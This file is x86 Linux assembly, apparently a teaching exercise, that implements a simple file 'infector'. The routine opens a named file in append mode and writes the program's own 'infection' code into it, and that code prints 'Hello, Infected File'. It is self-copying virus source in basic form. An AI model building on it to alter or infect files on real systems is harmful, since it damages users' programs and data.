section .data
    hello_msg db "Hello, Infected File", 10, 0
    readonly_msg db " cannot infect read only file", 10, 0 ;30

section .text
global _start
global system_call
global infector
global infection
extern strlen
extern main

_start:
    pop     dword ecx    ; ecx = argc
    mov     esi,esp      ; esi = argv
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    cmp     ebx, 0
    jne     exit_error
    mov     eax,1
    int     0x80

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    infection:
        mov     eax, 4         ; system call number for sys_write
        mov     ebx, 1         ; file descriptor STDOUT
        mov     ecx, hello_msg ; address of the message in .data
        mov     edx, 22        ; length of the message
        int     0x80           ; invoke system call
        ret


    infector:
        mov     eax, 5            ; sys_open
        mov     ebx, [esp+4]      ; filename
        mov     ecx, 0x401        ; flags: O_APPEND
        mov     edx, 0            ; mode: ignored for O_APPEND
        int     0x80              ; call system call

        cmp     eax, 0            ; check if open was successful
        js      infector_exit     ; exit if file open failed, with exit code 0x55

        mov     ebx, eax          ; save file descriptor

        mov     eax, 4                     ; sys_write
        mov     ecx, code_start            ; address of infection code
        mov     edx, code_end - code_start ; length of infection code
        int     0x80                       ; call system call

        mov     eax, 6            ; sys_close
        int     0x80              ; call system call
        ret

code_end:

infector_exit:
    mov     ecx, ebx
    mov     ebx, 1
    push    ecx
    call    strlen
    mov     edx, eax ; length of file name
    mov     eax, 4
    int     0x80           ; invoke system call

    mov     eax, 4         ; system call number for sys_write
    mov     ebx, 1         ; file descriptor STDOUT
    mov     ecx, readonly_msg ; address of the message in .data
    mov     edx, 31        ; length of the message
    int     0x80           ; invoke system call

    mov     eax, 1            ; sys_exit
    mov     ebx, 0x55         ; exit code 0x55
    int     0x80              ; invoke system call

exit_error:
    mov     eax, 1
    mov     ebx, 0x55
    int     0x80
